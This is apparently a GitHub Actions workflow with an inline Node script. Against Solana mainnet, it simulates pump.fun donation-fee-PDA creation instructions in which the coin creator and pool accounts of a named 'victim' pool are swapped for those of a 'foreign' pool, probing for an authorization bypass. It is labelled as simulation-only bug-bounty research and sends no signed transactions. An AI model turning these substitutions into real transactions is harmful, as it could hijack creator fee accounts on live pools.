name: donation-create-foreign-pool-runtime
on:
  push:
    paths:
      - '.github/workflows/donation-create-foreign-pool-runtime.yml'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 8
    steps:
      - uses: actions/setup-node@v4
        with: {node-version: 24}
      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js
      - name: Simulation-only victim mint / foreign pool creator authorization differential
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction,Keypair} from '@solana/web3.js';
          import * as p from '@pump-fun/pump-sdk';
          import {OnlinePumpAmmSdk} from '@pump-fun/pump-swap-sdk';
          const RPC='https://api.mainnet-beta.solana.com',c=new Connection(RPC,'confirmed'),amm=new OnlinePumpAmmSdk(c);
          const TX_PAYER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
          const VICTIM_POOL=new PublicKey('2AZvfjn3Hre5mM47bRv6VnKRX36wSDW6vrkC5ykK3X7T');
          const FOREIGN_POOL=new PublicKey('DSV2CUbhfEWRPRn9QRZWkYohRi47WEeauz8s89ekKBdN');
          const victim=await amm.fetchPool(VICTIM_POOL),foreign=await amm.fetchPool(FOREIGN_POOL);
          const MINT=victim.baseMint,VICTIM_CREATOR=victim.coinCreator,FOREIGN_CREATOR=foreign.coinCreator,CONFIG=Keypair.generate().publicKey,DON=p.donationFeePda(MINT,CONFIG);
          console.log('CONTEXT',JSON.stringify({mint:MINT.toBase58(),victimPool:VICTIM_POOL.toBase58(),victimCoinCreator:VICTIM_CREATOR.toBase58(),foreignPool:FOREIGN_POOL.toBase58(),foreignBaseMint:foreign.baseMint.toBase58(),foreignCoinCreator:FOREIGN_CREATOR.toBase58(),config:CONFIG.toBase58(),donationPda:DON.toBase58()},null,2));
          const existing=await c.getAccountInfo(DON,'confirmed');console.log('DONATION_EXISTS',!!existing);if(existing)throw Error('random donation PDA unexpectedly exists');
          const control=await p.PUMP_SDK.createDonationFeePda({coinCreator:VICTIM_CREATOR,mint:MINT,configId:CONFIG});console.log('CONTROL_KEYS',JSON.stringify(control.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
          function replace(ix,map){const keys=ix.keys.map(k=>({...k}));for(const [oldPk,newPk] of map){const i=keys.findIndex(k=>k.pubkey.equals(oldPk));if(i>=0)keys[i].pubkey=newPk;else console.log('NO_KEY',oldPk.toBase58())}return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
          function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|creator|pool|donat|sharing|failed|success/i.test(x)).slice(-140)}}
          async function sim(label,ix){const {blockhash}=await c.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:TX_PAYER,recentBlockhash:blockhash,instructions:[ix]}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:[DON.toBase58()]}}]};const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-donation-create/1.0'},body:JSON.stringify(body)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs);let created=null;const a=v.accounts?.[0];if(a?.data?.[0]){try{created=p.PUMP_SDK.decodeDonationFeePda({data:Buffer.from(a.data[0],'base64'),owner:new PublicKey(a.owner),lamports:a.lamports,executable:a.executable,rentEpoch:0})}catch(x){created={decodeError:String(x),hex:Buffer.from(a.data[0],'base64').toString('hex')}}}const safe=x=>{if(x==null)return x;if(x?.toBase58)return x.toBase58();if(x?.toString&&x.constructor?.name==='BN')return x.toString();if(typeof x==='object'){const o={};for(const [k,z] of Object.entries(x))o[k]=safe(z);return o}return x};console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,created:safe(created),interesting:e.interesting},null,2));return {v,e,created}}
          await sim('CONTROL_victim_creator_victim_pool',control);
          await sim('TEST_foreign_creator_foreign_pool',replace(control,[[VICTIM_CREATOR,FOREIGN_CREATOR],[VICTIM_POOL,FOREIGN_POOL]]));
          await sim('TEST_foreign_creator_victim_pool',replace(control,[[VICTIM_CREATOR,FOREIGN_CREATOR]]));
          await sim('TEST_victim_creator_foreign_pool',replace(control,[[VICTIM_POOL,FOREIGN_POOL]]));
          NODE